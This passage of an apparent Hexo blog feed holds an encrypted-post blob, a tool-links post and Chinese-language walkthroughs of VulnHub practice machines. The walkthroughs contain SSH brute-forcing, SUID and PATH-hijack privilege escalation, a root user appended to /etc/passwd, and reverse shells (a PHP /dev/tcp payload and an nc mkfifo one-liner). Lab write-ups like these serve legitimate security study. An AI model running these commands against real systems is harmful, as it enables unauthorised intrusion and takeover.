1fb186a4b3f49d637c788de4200ea5e017de504764ef0fe755f81acaa12e3498802b4f9bbe680616427f103244c38d38036e6b5b6d6df93fe3479eb2d5b72619b2477ee312978b35ca304335ba66a83222ac8c7ba6c3ba2c2c140b4fa60c08efb6fc8ad40bf10d9479dfa757bb2174231ac268afc9461a24d8688aaf802a33dbddb1f7ff9dee9192548d4e6dd87a4ff93b2700add30136bf7da9e2f1fb141896f708077d8686a8c22e4dd16391d4799bdaa90c38de9d1cca137fb9f87a2e3950f4dc8cf967cc371f6d7249b602b85cce00c072a150e7cfbe3180ce27495844e9ca57893e83ad2584e7b85b62b34b4bc68ee6f62bf0cf4ed0050a4fe005f5e8cb51020bbf4ef9dd9012ef859a40d72c6407efa83a6ccfa5c7a057d9bcf3bd51df50d6fb79899f892b8ad7aa4b471669c856ff170d3919455ab57dabbbe4d17fe7a0cc465cc6061557015861a047354e6239351f7d516500d4eaa3a0d772fba338b1d8a58008421c8670bd2b8504335b1b33d6cb8e7d45e9dd9a40634206f8bbde08120508b5bf08bd0c25627339e6527e6b113b55103f579418b9d3788ee8bfdba3a29c6e403fe76c6f97157526ad45a4af523b11188e79a337c34d77dbcfae1ef40ff7850e9b56235928306a89d8bf030f917540d1d0d1e598c20dc28cea716de408450b8c9eec7bbb06d4ed56117b38efd73adc0252c1637d95d82d0cd5ed22caa5378fb344ccc95d904d01e34c59637a0c30c1272e948358cf585378b685a7e3da1daf35eaaa1d114d43b5a7f8316a618b570a26eb5fb772f14e4e0adb2dd9517d7df873c78e5fc22b19c1fd6dd2e09c8474ef01750ea69ede1ef117825d77c8ec08e73b289691de9687afaa21f969e21dc6dd2aa04a08295e9965f2229288b60310ed2889578fdabb8053e56eec41befafbccab0ab4e5ba8497b537e6e1d1e1aa918e80927933ea0535d5cc7c5c84b79bca41b641b1635d7cae705d96c650420bbfd5c27531686ff0455ffeed8ffe31366bd95d919a601a820ac141d6a51347a131dae889643a331da0869dbd37de5ad7718fbd80f3273e5861e5f4c74c4825105ee5e7605b374f0ffcf396a487dc921acd306d42100e5120195a6343f4edcd4bc84806fb1bcbd8d5f65b167cf08b5901b6f0b641cb59457bf726eec833235cb8d8bae9cca167e4241db77c4da203690b7d1312b7b691643f922e80cb450d6bb08f60d52153cbd0ccff1099eebdbf04b427ac9ac983408006498c9ef7cb73c622dad893975d6ff6499a7e8967d6f9dac21c7e29417cb1e8bce7fcd31847c83db3ddab067b7294fc5f1d9672acd5652b2b3cd98382e6b7495f52835355d89a9711e651b5d3fff383325fbf2a5cdcd6669fd1acd16d6cc58b766f96bae0b22d6c9e27e6ebd39ae2bb790e0da5f1f216a40d7c39139f6a327ed11d0b7d710e2f0528a8d4066cbe07ba102c24f479a42323241d1319d20fa69dc3e25631162fbb9060721acc3353fad4690dc09c0ea15afc35b8b1d98d4e2d31e113e570ccf8b9269c3990160eb3b8e72ba6f6d98eaf7db843f89284578660ecf81ba8173926a19d26fada82fb9b218885a2e7fb2fdc43d16d0741dc41bcaf1472b732648e53eda6e121e55f35bc5ca14ed2d8dcbd27f55cbd5191e4fb6b83987059d1b539e1f709e645d49a3540ed481e8934860d71ad94492817f965691c36240eb09ceb6fb5b9e8a199f39d7c00f8dea12ba832e02f377eaefaa62092ca5ffadc7386bcbf8bca9be4d09bf84f29740aeaa38e0944aef1ad2e527fe297f12a4d563ad177ccaf8ad7260bdaa2448f2f9a7348e2886bf3aa1983508c0324afcf36e9df599a16f98fd629de0bb2edb232fd4bc517190548ae7329649eb5e4a6f53128097cf9ee8d804da1ab0edbed6219fc380e95ff7da5720c4ce94eb7a1ba3dac7b70c0b1112a7a9ec812f00dbab68659dc381fffbccbbe3e45728911aa822483f2779ae7f5445b060e9c0591274e99ceab1ceb9afe5c4cabb959d9a588e0f85be3e3a46b24c38681d037dc94840d6fcbc192824547363ec99ba66ac7cd3820355fd9f0a65277224c325f993217cfe027460ccdb643ff2d369c1b72af48e29c7f6b8d6363bfe50b2ebab4113fd8d258e764966b281b9cfd4409e2d0745965f5c9317cfc614ae44ba93985596dcc6f6200d519e2632f5e1e45121556e59abdd1959eb8d917521abe7100184d94c6b75b498e28b0354552ebe80cc989c28cda8028db08d1a8e80f8c63b3452310efc6fb9f96fd1d14cb775ce3f5205e998045f9b582f7f708f89bfae28051f2caf177e1c18b9e058365f5d2cf4ad6729c9f54967d0e09cbf6271963fe2ab3427f0471edec134303eb88be461f049827bf44ec086fc07a91e03464e6d1b0314e5831d4ee4a67f5c761674a98b2622f69a21ca33b516aebeff1afa1983228673c3480d49575cc0b003880400c8ec989fd55e9cb2e4fb440b1597d7d9cb0da6e4193e40dc2ee09beab96a614ee6a9d4d0486b2638c834a37919dd8c7ddf4bfe24d08218d326c539afa27c8b6a94685dff2865038df10dda348445d01e264e7aa4155fa03c7978b3bede8126773228f145c9fd68ecbf2da82cdbfc88b7c398f3c735c5217889657d8c19926cb4e3670e365fefcc87c098027ce1db45c05cab2cba099c12bfe55b7ae1d7b15eac1a66d4a1d8083027827817936925b32869b172443371eb6f75a5881f9f2528c813c7a91e99494485b269d93972e8d433756ad18eecaf2c65cfe5297a18c71ec0be08f36f44b1ff5646229da4115c8f4e4c97958815b1efe1bafd9009d1eb155f78d67a5c90b2d0c2be2bcf296299ff3bf1ae91ed820520ed13bb1acf47a3f8004bc5fa6766f108f5eee470e538e6ee3528e25453a430446d53e57c6f6ab6715bd76cb86c9a0c86c1b1b83e665c65dc91a48c82efbde4d967f1ee7378c26e9b5b1a5e02be32ca7d01bb68d1ea337ed873c180ec8df172262343505e2234f01016a505a90c3426a3aca8feec405b1c8d1cd9b6a0dcf0b46c5081a3925635a529ef41030b150f2ef408d430c7aaf395f111d5e27ae859124d921ac08992b4d01c743cdaf80ddad1ad69e1c02aa03c2b130810cd5840061557f433537e2ea0f1b2e11724136c22a2cccd2d63d81cdeb61078f63cde9b4b8d31cfeaa7f9fe608c7cb958d84c04510ba4abe3ae92dd7cf3969854c85aad7264dd276c5d179c1066b821500efd426f7785e525bbc4099b90d57b6497f30f2c03152b15f2bb6f21def2d41db646b591bd35403a80c9ad5ffca6bc0a447f537f3eb722d7078793db4d09bdd3319611e01d7809f8df2f347403aaa277a238c091a0a90f4a3c5db84576ad3a823ca4b80e36d8a0a006db78653a5d3b9555a013015280ecd265ae6c72ca3268643cc0a8c6550d3102d8c3c65c65a605f1b4cf81db61980aee8b55ce4b4c41411390152f0b66e9cae34f29c37e1c283796ccebc64f9968351fecb116b74e589d4f9f15f69de5a315accfeef9674a3caaedc34c452d0937acd94823c2b802285ce6fc4769281925e73310ab5d381308b10dbf616c024be2631ddc2bbb985ee492eab4eaff3753b88f874cb08fc6767e73339e016b06d25936fa0cfc63f4343ca5ab2cb180e0de084b23d6959f1eccf20bd1be280539b162c7b33adfe233f704b7c88bcbbd394885b4465dca55b4349151e5b790191411f3c65a453c08fb80d0ba3310a6311c3917151b6109be02b228852371e2099bd139e250ae3e461bee7647dc821cff76cf8b63ffd6f47e72b03b9c8e8396dfc8ecd315f46548dccacf4e8a9e7ace3d5e4f58248b5856afde4dbc957b48c4dabd168878a74213c54caa3c1e16486577498cadfad7894342a7e15804b32db4e4939bd274c47f33434242f6d88a3624616e563900817eda056d92881cdec942e1633d8b9cc8b2224fdf52b82b78b7a2d96b6392df71a5ed13ff693eef4fbaffbbf5a46138ca80bf071f20abd3df8001de6bbea40ceed4a20b9845b8e017ca214fc4002aec7bed73e1dcfa72ee9eb1dc6c38f5d40bb85465258580c1dd178f001eb7cca4990e85da27b33a50e8ba9dae9a239bd5fd00ea2dd7c66b2339249bda886b13f687345d405db54bcfa4de90f716de816a3f6842256ae5e67857d1ff804612515f1e699e2cec9db555063b123b87020bb5950fadf9a40fa87113e776201d7ebe635131781260db771664621dbf3a62eba4a147b5a6a95218f87e04d4c50ed2d203d813b51657391a6f6e89376a375cd6e009553c97b0dbb4735a1685f1464277d6f45569709ddc92ec983fa53af2a34a9ed98927dc21b18cad73da0f1751a234cbf244ab7c001e4fcfa356d38b22e79ab7f8df44cd44a44a4a357e327985809eae6c426db129c15f2d8427414d08d14b8ca79f891458d822e8c3cbe0391e3d51d842f8059ed681b5aaebd3a54d8643a95ee9c9d65b7ca1d7e7d6a0c96a0dfa1b1f1ecf3ceb91950044d4dc63234f7ab5f803faea7f1e6d27201b560e77a8710b7c9fb22d038b8235c2775e953a4c294a618e6ca43af9c4f00c9b75bc251655f48380d7f6fc831ba8dfdb41e190f82cdf90a59381653a8dc6978e47de2ab0eef2e8cb3732d90acc15637fb53fe7a76b8481fdf2e20b26c6ab4a02e460a204eeeed08717c7b769a476cda3609723d81e6704852bad63ca01552c1d0585d3af990620709e69c2ec3828217943e57c98bcabfcb953625e6f99adf40d090102b1412006f8af2e747983d294cc05c2373d5d3f0b93697d2a1f0d2a5bcace87af75a88bde059d6b0510ec1f47ef53a6c4515d60788e2f9db9351cd84d37e528640e4e452f5b36cc2b4fee4a642d202849135ae589566dffe3594611eaef2dd5bb9409cf3d9b187294ba19f60368e7a447c8a3d86eb0228cae10a9b821e73a4276bdc7cde9fef3f5c8af0ce20a69e6bf6f9bece273ffd88a0b19b44bb5ab6147db2a56becbd3e3a526465ceb701ed166af327a7acdc271e1505883415162f0a91b75e746f5afdaa7fb79542d40c5e533135d44a09f172238ec878e9b6b0b3df07a4d39d35377f070afcd1eb32b133fd70878dfecfb4d1087106a71d050f4350b8d61b4e0cd68b34f5d9f2ef3b9d8945aadbc8e3c9b2a991611ebb8b48ad981507098d484f5e881c72cc203ef993637699fe9bac11b9c03f5bea895bead81164ed25e2b4b4f9b364e981b0f432f37f01947fad164d68fea03d3ad2459fbc3b7a6af8c1b8619ef9c084f30fe1aff444e181f3f2228d1683b2ca7092d251603bbadbf541465dad24f76afa84a590d76b57443260b7487b47cc4bd03e87f98d4c1b4625f99f66684e26b32357e9cd52d7fa11f94553033af26811ac18b863c17dbbe731ce14844ddb16de0124c6978b4c365347a0b0eb1dba2c68327fbaebd0329d2606f0ea0a9f1c727e302472c526d9270f176c169ae14618208768423d17316a3df3ab5cd87eb6efdfeaf09cf24de19aa1e5d3b9e72c8c78378397a9bb9916a780c7cdcd37ba04c81669fa6f2be64ee6ab6d1b7afc2aa4c03d15d97c76fd5c8a496eb0abd4d5cb9f1922d33d0f91383ee60d7cb10d36c8e4701efa98af250840cea8bc5a692c419f34c05447ba0b25da1ca9556ad26d792700101ce3c20eb9a3e38a816623bc7996864813ca848f795e7c1fe500a8b4cc9fd4b04be190136ad4cb7e05549c7e1a4c4306c82b989b600ee0dbfd8f3d370af6acd215479f96355414465a06c03c10d48f040c9d4bae64802e218e023a3f4e6f8116ae76ae172412a68406a00625f3313f010e43ae88ddab19a2a796379b0c4a8740a962b24dd6c34e6b02e52e250d8e28b40bc9f8f8798ef6e82189e40403b4a9ea496de134fb8dd6b395db72bffacf242a52f76d51d617b04b4259345315bb0cbb318a73a0eccc6a64688371f78d892784e094bf28000d9b29860b587a6c9f953a773895b72e12a66c273a8c1b84a6322830722a9c4bb43ef04cf433329989b1722965ee156f9d02be7fb4524a76c074f7a6a92975c29746f5a43599d6001c517517e62d1f56f53d1d60d32a8038c207a38f4686c7f95b1f938dff57e322d2bd0ca836172a382091d84f82df3e9f15dac3018626451a7640cc3dbd6a4d08e9274b0cd72fca15e2e7915335a01be96646c11dafe761d4143a05d015ac7ce5b92</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>linuxå·¥å…·</title>
    <url>/2023/07/08/linux%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p> æ…¢æ…¢å†™</p>
<span id="more"></span>

<h2 id="passwarekit"><a href="#passwarekit" class="headerlink" title="passwarekit"></a>passwarekit</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.downkuai.com/soft/137912.html</span><br></pre></td></tr></table></figure>



<h2 id="terimus"><a href="#terimus" class="headerlink" title="terimus"></a>terimus</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ddooo.com/softdown/182046.htm</span><br></pre></td></tr></table></figure>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>docker å®‰è£…</p>
]]></content>
      <tags>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>oscp1</title>
    <url>/2023/07/28/oscp1/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="Gaara"><a href="#Gaara" class="headerlink" title="Gaara"></a>Gaara</h2><p>&#x2F;iamGaara</p>
<p>å‘ç°ç±»ä¼¼ç”¨æˆ·å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.59</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230728171600.png"></p>
<p>è´¦å·å¯†ç å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><a href="https://gtfobins.github.io/gtfobins/gdb/">gdb | GTFOBins</a></p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230728174612.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230728174709.png"></p>
<h2 id="vegeta"><a href="#vegeta" class="headerlink" title="vegeta"></a>vegeta</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/robots.txt</span><br></pre></td></tr></table></figure>

<p>å‘ç°&#x2F;find_meè®¿é—®find_me&#x2F;find_me.htmlï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°base64 åŠ å¯†ï¼Œ</p>
<p>è§£å¯†ä¹‹åéšæ³¢é€æµè½¬å›¾ç‰‡<a href="https://tuzim.net/decode/">åœ¨çº¿äºŒç»´ç è¯†åˆ«,äºŒç»´ç è§£ç  - å…”å­äºŒç»´ç  (tuzim.net)</a>è¯†åˆ«</p>
<p>å</p>
<p>Password : topshellv</p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230807011640.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -r -u http://192.168.1.58/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -e</span><br></pre></td></tr></table></figure>

<p>&#x2F;bulma ï¼Œæ˜¯ä¸€æ®µéŸ³é¢‘éŸ³é¢‘åœ¨çº¿è§£å¯†ç½‘ç«™</p>
<p><a href="https://morsecode.world/international/decoder/audio-decoder-expert.html">Morse Code Audio Decoder | Morse Code World</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U S E R : T R U N K S P A S S W O R D : U S 3 R ( S I N D O L L A R S S Y M B O L )</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ· trunks å¯†ç  u$3r</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /etc/passwd</span><br><span class="line">-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¹ŸåŒæ—¶å±äºå½“å‰ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt zhou zhou</span><br><span class="line">$1$zhou$IY3SDlxhR.gde5eP6C/Y/0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>å°†rootæ¢ä¸ºzhou x æ¢ä¸ºè§£å¯†åçš„å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;zhou:$1$zhou$IY3SDlxhR.gde5eP6C/Y/0:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>å†™å…¥å³å¯</p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230807020701.png"></p>
<p>è¿™ä¸ªé¶æœºæ¯”è¾ƒå®¹æ˜“</p>
<h2 id="infosec"><a href="#infosec" class="headerlink" title="infosec"></a>infosec</h2><p>ä¸‹è½½åœ°å€<a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep: OSCP ~ VulnHub</a></p>
<p>æ‰«æé¶æœºip è®¿é—®robots.txt å‘ç°&#x2F;secret.txt</p>
<p>è®¿é—®ï¼Œçœ‹åˆ°base64 ,è§£å¯†åå‘ç°æ˜¯ç§é’¥</p>
<p>ä¿å­˜ä¸ºåå­— 2 èµ‹äºæƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 700 2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh  oscp@192.168.56.106 -i 2</span><br></pre></td></tr></table></figure>

<p>suid ææƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -exec ls -al &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/bash -p</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230807192439.png"></p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230807192518.png"></p>
<h2 id="INCLUSIVENESS"><a href="#INCLUSIVENESS" class="headerlink" title="INCLUSIVENESS"></a>INCLUSIVENESS</h2><p>é¶æœºä¸‹è½½åœ°å€</p>
<p><a href="https://www.vulnhub.com/entry/inclusiveness-1,422/">inclusiveness: 1 ~ VulnHub</a></p>
<p>è®¿é—®robots.txt ï¼ŒYou are not a search engine! You canâ€™t read my robots.txt!</p>
<p>ã€‚æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ‘ä»¬çš„æ•°æ®åŒ…UAå¤´æ¥ç»•è¿‡æ£€æµ‹ã€‚ï¼ˆGooglebotæ˜¯è°·æ­Œçˆ¬è™«ï¼‰</p>
<p>&#x2F;secret_information</p>
<p>secret_information&#x2F;?lang&#x3D;&#x2F;etc&#x2F;passwd</p>
<p>å­˜åœ¨æ–‡ä»¶åŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.111 -p- -sV -A </span><br></pre></td></tr></table></figure>

<p>å‘ç°ftpæœåŠ¡ï¼ŒåŒ¿åç™»é™†</p>
<p>anonymous ï¼ˆåŒ¿åçš„ï¼‰</p>
<p>å½“å‰ç›®å½•æ²¡æœ‰å†™å…¥æƒé™cd pubä¸‹æœ‰å†™å…¥æƒé™</p>
<p>put shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">system(&#x27;sh -i &gt;&amp; /dev/tcp/192.168.56.105/5000 0&gt;&amp;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶åŒ…å« &#x2F;secret_information&#x2F;?lang&#x3D;&#x2F;var&#x2F;ftp&#x2F;pub&#x2F;shell.php</p>
<p>ä½†æ˜¯ç”±äºå¼¹ä¸å‡ºæ¥ï¼Œæ‰€ä»¥ï¼Œå†™ä¸ªé©¬è¿›å»ï¼Œæ–‡ä»¶åŒ…å«</p>
<p>ä½¿ç”¨é©¬å‘½ä»¤æ‰§è¡Œè¿˜æ˜¯ä¸è¡Œ</p>
<p>åå†³å®šä½¿ç”¨msf php reverse åå¼¹shell</p>
<p>åå¼¹æˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -exec ls -al &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root 16976 Feb  8  2020 /home/tom/rootshell</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;checking if you are tom...\n&quot;);</span><br><span class="line">    FILE* f = popen(&quot;whoami&quot;, &quot;r&quot;);</span><br><span class="line">    char user[80];</span><br><span class="line">    fgets(user, 80, f);</span><br><span class="line">    printf(&quot;you are: %s\n&quot;, user);</span><br><span class="line">    //printf(&quot;your euid is: %i\n&quot;, geteuid());</span><br><span class="line"></span><br><span class="line">    if (strncmp(user, &quot;tom&quot;, 3) == 0) &#123;</span><br><span class="line">        printf(&quot;access granted.\n&quot;);</span><br><span class="line">        setuid(geteuid());</span><br><span class="line">        execlp(&quot;sh&quot;, &quot;sh&quot;, (char *) 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;printf &quot;tom&quot;&quot; &gt; whoami</span><br><span class="line">chmod +x whoami</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/tom</span><br><span class="line">./rootshell</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230808225617.png"></p>
<h2 id="dawn"><a href="#dawn" class="headerlink" title="dawn"></a>dawn</h2><p>ä¸‹è½½åœ°å€</p>
<p><a href="https://download.vulnhub.com/sunset/dawn.zip">https://download.vulnhub.com/sunset/dawn.zip</a></p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230809150101.png"></p>
<p><strong>smbclientå‘½ä»¤</strong>å±äº<a href="https://so.csdn.net/so/search?q=samba&spm=1001.2101.3001.7020">samba</a>å¥—ä»¶ï¼Œå®ƒæä¾›ä¸€ç§å‘½ä»¤è¡Œä½¿ç”¨äº¤äº’å¼æ–¹å¼è®¿é—®sambaæœåŠ¡å™¨çš„å…±äº«èµ„æºã€‚</p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230809173417.png"></p>
<p>æ‰«ä¸€ä¸‹ç›®å½•å‘ç°logs,ç„¶åæŸ¥çœ‹</p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230809173208.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.107 4444 &gt;/tmp/f&#x27; &gt;product-control </span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230809173906.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suid ææƒ</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è·å¾—æƒé™</p>
<h2 id="funbox-rookie"><a href="#funbox-rookie" class="headerlink" title="funbox: rookie"></a>funbox: rookie</h2><p> ä¸‹è½½åœ°å€<a href="https://www.vulnhub.com/entry/funbox-rookie,520/">Funbox: Rookie ~ VulnHub</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.108 -A -p- -sV</span><br></pre></td></tr></table></figure>

<p>å‘ç°ftp æœåŠ¡ åŒ¿åç™»å½•ä¸‹è½½æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget ftp://192.168.56.108/tom.zip</span><br></pre></td></tr></table></figure>

<p>zip2johnè·å¾—ä¸­é—´Hashæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john tom.zip &gt;&gt;pass.txt </span><br></pre></td></tr></table></figure>

<p>john ç ´è§£ ï¼š  iubire </p>
<p>ssh è¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa tom@192.168.56.108</span><br></pre></td></tr></table></figure>

<p>rbashç»•è¿‡ï¼Œä¹‹å‰è§è¿‡çš„vi ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæœ«è¡Œå‘½ä»¤ï¼Œå›è½¦</span><br><span class="line">cd /tmp</span><br><span class="line">vi test</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd/home/tom</span><br><span class="line">ls -al</span><br><span class="line">cat .mysql_history</span><br><span class="line">sudo -l</span><br><span class="line">å¯†ç  xx11yy22!</span><br><span class="line">su</span><br><span class="line">xx11yy22!</span><br><span class="line">ææƒæˆåŠŸ</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230810023526.png"></p>
]]></content>
  </entry>
  <entry>
    <title>çº¢æ—¥é¶åœº1</title>
    <url>/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
    <content><![CDATA[<p> æ‰“ä¸€ä¸‹å†…ç½‘æ¸—é€</p>
<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/1605154-20200928100252971-711962221.png"></p>
<!--mroe-->

<h2 id="é¶åœºæ­å»º"><a href="#é¶åœºæ­å»º" class="headerlink" title="é¶åœºæ­å»º"></a>é¶åœºæ­å»º</h2><p>é¶åœºä¸‹è½½åœ°å€</p>
<p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">æ¼æ´è¯¦æƒ… (qiyuanxuetang.net)</a></p>
<p>vmç½‘å¡è®¾ç½®,win7,ä¸¤ä¸ªç½‘ç»œé€‚é…å™¨</p>
<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709213618.png"></p>
<p>å‰©ä¸‹ä¸¤ä¸ª</p>
<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709213740.png"></p>
<p>é»˜è®¤ç™»å½•å¯†ç ï¼š hongrisec@2019</p>
<p>æ‰“å¼€ä¹‹åå‘ç°å•¥ä¹Ÿæ‰«æä¸åˆ°ï¼Œä¹‹åç™»å½•è¿›å»ï¼Œå…³é—­é˜²ç«å¢™ï¼Œå¯åŠ¨phpstudy</p>
<p>åæ‰èƒ½æ‰«æåˆ°ï¼Œ</p>
<p>win7 å¤–ç½‘ip:192.168.158.170</p>
<p> å†…ç½‘ip: 192.158.52.143</p>
<p>windos2018 Ip 192.168.52.138</p>
<p>win2k3 ip 192.168.52.141,</p>
<p>ç»ä¾§å¼åå‘ç°èƒ½å¤Ÿpingçš„é€šï¼Œåº”è¯¥å°±æ­å»ºå¥½äº†å§ã€‚</p>
<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.167 -Pn //å¼€æ”¾ç«¯å£</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.158.167</span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ¼æ´ä¸€ï¼š</p>
<p>phpmyadminå¼±å£ä»¤ç™»å½•root root</p>
<p>æŸ¥çœ‹èƒ½å¦å†™å…¥æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;secure%&quot;;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>secure_file_priv</th>
<th>NULL</th>
</tr>
</thead>
</table>
<p>å†™ä¸è¿›å»ï¼Œæ‰€ä»¥æŸ¥çœ‹æ—¥å¿—</p>
